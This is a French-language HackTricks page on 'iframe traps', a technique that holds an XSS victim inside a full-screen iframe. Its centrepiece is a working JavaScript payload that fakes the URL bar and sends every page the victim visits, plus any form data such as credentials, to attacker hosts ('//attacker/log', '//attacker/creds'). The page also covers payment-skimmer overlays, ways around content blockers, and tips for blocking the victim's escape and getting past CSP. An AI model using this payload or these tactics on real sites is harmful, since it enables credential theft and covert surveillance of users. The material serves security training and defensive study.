# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Informations de base

Cette forme d'abus de XSS via des iframes pour voler des informations lorsque l'utilisateur se déplace sur la page web a été initialement publiée dans ces 2 posts de trustedsec.com : [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

L'attaque commence sur une page vulnérable à un XSS où il est possible de faire en sorte que les **victims ne quittent pas le XSS** en les faisant **naviguer à l'intérieur d'un iframe** qui occupe toute l'application web.

L'attaque XSS charge essentiellement la page web dans un iframe occupant 100% de l'écran. Par conséquent, la victime **ne remarquera pas qu'elle est dans un iframe**. Ensuite, si la victime navigue sur la page en cliquant sur des liens à l'intérieur de l'iframe (dans le web), elle sera **en train de naviguer à l'intérieur de l'iframe** avec le JS arbitraire chargé qui vole des informations de cette navigation.

De plus, pour rendre cela plus réaliste, il est possible d'utiliser des **listeners** pour détecter quand un iframe modifie la propriété location de la page, et mettre à jour l'URL du navigateur avec ces emplacements afin que l'utilisateur pense qu'il navigue réellement dans le navigateur.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

De plus, il est possible d'utiliser des listeners pour voler des informations sensibles, non seulement les autres pages que la victime visite, mais aussi les données utilisées pour **remplir des formulaires** et les envoyer (identifiants ?) ou pour **voler le local storage**...

Bien sûr, les principales limitations sont qu'une **victime qui ferme l'onglet ou met une autre URL dans le navigateur sortira de l'iframe**. Une autre façon d'y échapper serait de **rafraîchir la page**, cependant cela peut être partiellement **empêché** en désactivant le menu contextuel du clic droit à chaque chargement d'une nouvelle page dans l'iframe ou en détectant lorsque la souris de l'utilisateur quitte l'iframe, potentiellement pour cliquer sur le bouton de rechargement du navigateur ; dans ce cas l'URL du navigateur est mise à jour avec l'URL d'origine vulnérable au XSS, donc si l'utilisateur la recharge, elle sera à nouveau empoisonnée (à noter que ce n'est pas très discret).

## Piège modernisé (2024+)

* Utiliser un **full‑viewport iframe** plus History/Navigation API pour imiter une navigation réelle.

<details>
<summary>Piège iframe plein écran</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) garde la barre d'URL externe synchronisée without leaking the real URL.
* Passez en **fullscreen** pour masquer l'interface du navigateur et dessiner votre propre fausse barre d'adresse / cadenas.

## Overlay & skimmer usage

* Des merchants compromis remplacent les hosted payment iframes (Stripe, Adyen, etc.) par une **pixel‑perfect overlay** qui transmet les frappes clavier pendant que la frame réelle reste en dessous, utilisant parfois des legacy validation APIs pour que le flow ne se casse jamais.
* Piéger les utilisateurs dans le top frame capture les données **autofill/password‑manager** avant qu'ils ne remarquent que la barre d'URL n'a jamais changé.

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` local frames héritent de l'origine du parent et contournent certaines heuristiques des content‑blockers ; des iframes imbriqués peuvent respawn même quand les extensions détruisent les frames third‑party.
* **Permission propagation** : réécrire l'attribut parent `allow` accorde aux frames attaquantes imbriquées fullscreen/camera/microphone sans changements DOM évidents.

## Quick OPSEC tips

* Remettez le focus sur l'iframe quand la souris sort (`mouseleave` sur body) pour empêcher les utilisateurs d'atteindre l'UI du navigateur.
* Désactivez le menu contextuel et les raccourcis courants (`keydown` pour `F11`, `Ctrl+L`, `Ctrl+T`) à l'intérieur du frame pour ralentir les tentatives d'évasion.
* Si CSP bloque les scripts inline, injectez un remote bootstrapper et activez `srcdoc` sur l'iframe pour que votre payload vive en dehors du CSP appliqué à la page principale.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
